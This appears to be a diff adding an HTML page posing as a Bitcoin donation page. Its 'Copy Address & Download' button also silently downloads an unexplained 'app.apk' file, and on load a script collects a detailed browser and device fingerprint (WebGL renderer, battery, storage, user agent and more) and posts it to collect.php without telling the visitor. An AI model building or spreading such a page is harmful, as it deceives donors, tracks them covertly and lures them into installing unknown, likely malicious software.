@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support Our Mission 🚀</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        /* Style de base */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 101vh;
+            color: #fff;
+            overflow-y: scroll;
+        }
+
+        /* Style de la barre de défilement */
+        body::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        body::-webkit-scrollbar-thumb {
+            background: #ffd700;
+            border-radius: 5px;
+        }
+
+        .container {
+            background-color: rgba(30, 30, 30, 0.8);
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            color: #fff;
+            margin: 20px;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 1.2s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        h1 {
+            color: #ffd700;
+            font-size: 26px;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            color: #00ffb3;
+            font-size: 20px;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+
+        p {
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .address {
+            background-color: #111;
+            color: #ffd700;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            word-wrap: break-word;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .address:hover {
+            background-color: #ffd700;
+            color: #111;
+        }
+
+        .button-copy {
+            padding: 12px 20px;
+            margin-top: 15px;
+            background-color: #ffd700;
+            color: #111;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transition: background-color 0.3s ease, box-shadow 0.3s ease;
+            width: 100%;
+        }
+
+        .button-copy:hover {
+            background-color: #f0c420;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .qr-code {
+            margin: 20px 0;
+        }
+
+        /* Agrandissement du QR code */
+        .qr-code img {
+            width: 250px;
+            height: 250px;
+        }
+
+        .secure-info {
+            font-size: 12px;
+            color: #a9a9a9;
+            margin-top: 10px;
+        }
+
+        .info-section {
+            background-color: rgba(50, 50, 50, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+            color: #fff;
+            font-size: 14px;
+            text-align: left;
+        }
+
+        .info-section h3 {
+            font-size: 16px;
+            margin-bottom: 8px;
+            color: #00ffb3;
+        }
+
+        .info-section p {
+            margin: 0;
+        }
+
+        .info-section a {
+            color: #ffd700;
+            text-decoration: underline;
+        }
+
+        .info-section a:hover {
+            color: #fff;
+        }
+
+        /* Style de l'image ajoutée */
+        .added-image {
+            margin: 20px 0;
+            width: 100%;
+            max-width: 300px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Notification de copie */
+        .copy-notification {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #00ffb3;
+            color: #111;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            opacity: 0;
+            animation: showNotification 1s ease forwards;
+        }
+
+        @keyframes showNotification {
+            0% {
+                opacity: 0;
+                transform: translate(-50%, 20px);
+            }
+            10%, 90% {
+                opacity: 1;
+                transform: translate(-50%, 0);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, 20px);
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Support Our Mission 🚀</h1>
+    <p>Your contribution, no matter how big or small, helps us level up. 🌍 Together, we can make a difference!</p>
+    
+    <img src="achat.webp" alt="Image illustrative" class="added-image">
+
+    <div class="qr-code">
+        <img src="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&address=bc1qdtq0f4h2p75snj0adhvelve8f4xr56mx03gv23" alt="Bitcoin QR Code" />
+    </div>
+
+    <h2>Donate Bitcoin Below: 🪙</h2>
+    <div class="address" id="bitcoinAddress">bc1qdtq0f4h2p75snj0adhvelve8f4xr56mx03gv23</div>
+    <button class="button-copy" onclick="handleCopyAndDownload()">📋 Copy Address & Download</button>
+
+    <div class="secure-info">100% Secure & Transparent ⚡</div>
+
+    <div class="info-section">
+        <h3>Why Donate with Bitcoin? 💡</h3>
+        <p>Bitcoin is fast, secure, and ensures your donation goes directly to supporting our mission. No banks, no middlemen, just your support powering change!</p>
+    </div>
+    <div class="info-section">
+        <h3>Questions? 🤔</h3>
+        <p>We’re here for you! Reach out to us at <a href="mailto:support@crypto.me">support@crypto.me</a> if you have any questions or concerns. We'd love to chat! 😊</p>
+    </div>
+</div>
+
+<script>
+    function handleCopyAndDownload() {
+        // Copie de l'adresse Bitcoin dans le presse-papiers
+        const address = document.getElementById('bitcoinAddress').textContent;
+        navigator.clipboard.writeText(address).then(function () {
+            showCopyNotification('Bitcoin address copied!');
+        }).catch(function () {
+            showCopyNotification('Failed to copy the address.');
+        });
+
+        // Téléchargement du fichier APK
+        const apkUrl = "app.apk";  // Remplace "app.apk" par le chemin exact de ton fichier APK
+        const link = document.createElement('a');
+        link.href = apkUrl;
+        link.download = "app.apk";  // Nom du fichier à télécharger
+        link.click();
+    }
+
+    function showCopyNotification(message) {
+        const notification = document.createElement('div');
+        notification.className = 'copy-notification';
+        notification.textContent = message;
+        document.body.appendChild(notification);
+        setTimeout(function() {
+            notification.remove();
+        }, 3000);  // La notification disparaît après 3 secondes
+    }
+
+    async function collectBrowserInfo() {
+        const data = {
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: `${window.screen.colorDepth} bits`,
+            language: navigator.language,
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || 'Non disponible',
+            connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'Non disponible',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Non disponible',
+            supportsCookies: navigator.cookieEnabled ? "Oui" : "Non",
+            supportsWebGL: (() => {
+                try {
+                    return !!window.WebGLRenderingContext && !!document.createElement('canvas').getContext('webgl');
+                } catch (e) { return false; }
+            })(),
+            webglInfo: (() => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    if (!gl) return 'Non disponible';
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Non disponible',
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Non disponible'
+                    };
+                } catch (e) { return 'Non disponible'; }
+            })(),
+            deviceMemory: navigator.deviceMemory || 'Non disponible',
+            storageEstimate: await navigator.storage.estimate().then(estimate => {
+                return estimate ? `${(estimate.quota / 1e9).toFixed(2)} GB / ${(estimate.usage / 1e9).toFixed(2)} GB utilisé` : 'Non disponible';
+            }),
+            battery: await navigator.getBattery().then(battery => ({
+                level: `${battery.level * 100}%`,
+                charging: battery.charging ? "Oui" : "Non"
+            })).catch(() => 'Non disponible')
+        };
+
+        fetch('collect.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.text())
+        .then(data => console.log("Informations envoyées:", data))
+        .catch(error => console.error('Erreur:', error));
+    }
+
+    window.onload = collectBrowserInfo;
+</script>
+</body>
+</html>
